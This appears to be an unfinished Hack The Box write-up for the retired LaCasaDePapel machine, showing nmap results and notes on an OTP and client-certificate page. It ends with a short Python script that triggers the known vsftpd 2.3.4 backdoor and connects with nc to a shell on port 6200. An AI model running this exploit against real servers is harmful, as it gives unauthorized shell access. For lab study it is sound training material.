---
layout: post
title: "HTB - LaCasaDePapel"
author: "mrs3c"
categories: Blog
tags: [hackthebox, htb, pen-testing, certificates, cronjob, nodejs, openssl, otp, php, psysh, ssh rsa auth, ssh, vsftpd]
image: lacasa_logo.png
---

To fill in later

# HTB retired machines - LaCasaDePapel

## Summary

Fill out later

## 1. discovery - network service scanning - nmap

```bash
# Nmap 7.80 scan initiated Sun Dec  8 21:59:21 2019 as: nmap -sC -sV -Pn -oA nmap/lacasadepapel 10.10.10.131
Nmap scan report for 10.10.10.131
Host is up (0.42s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
Service Info: OS: Unix
```

## 2. discovery - files and directories - http

 2.1 Navigating to port 80 we find a page which needs an OTP supplied by a QRCode. The page asks us to install Google Authenticator

![2_http](https://mrjak3.github.io/assets/img/htb-lacasadepapel-2-http.png)

 2.2 Scanning the code using Google Authenticator on an Android phone gives us a code but it refuses to work either way. So, maybe its for internal users only. Lets keep this aside and come back later.

## 3. discovery - files and directories - https

 3.1 Browsing to HTTPS shows us an error that we need a client certificate to continue which we don't possess at the moment

![3.0-https](https://mrjak3.github.io/assets/img/htb/LaCasaDePapel/3_https.png)

## 4. initial access - exploit public facing application - vsftp

 4.1 As seen from nmap, vsftp is version 2.3.4. A quick search allows the attacker to discover that the version was backdoored. Lets try to replicate the exploit code.

 4.2 The code just tries a failed login, which triggers the backdoor on port 6200 and then executes commands from it. Lets do that using a small python script:

```bash
import socket
import os
import time

def exploit(ip, port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip, port))

    sock.send('USER :)\n')
    sock.send('PASS HTBPASS\n')
    time.sleep(2)
    sock.close()

    os.system("rlwrap nc 10.10.10.131 6200 -v")

exploit("10.10.10.131", 21)
```

 4.3 The code is pretty simple, it just creates a connection to the FTP port, sends in commands and then quiclky connects to the backdoored port at 6200.
 4.4 Running the script:

 ![4.4_vsftp](https://mrjak3.github.io/assets/img/htb/lacasadepapel/4.4-vsftp.png)
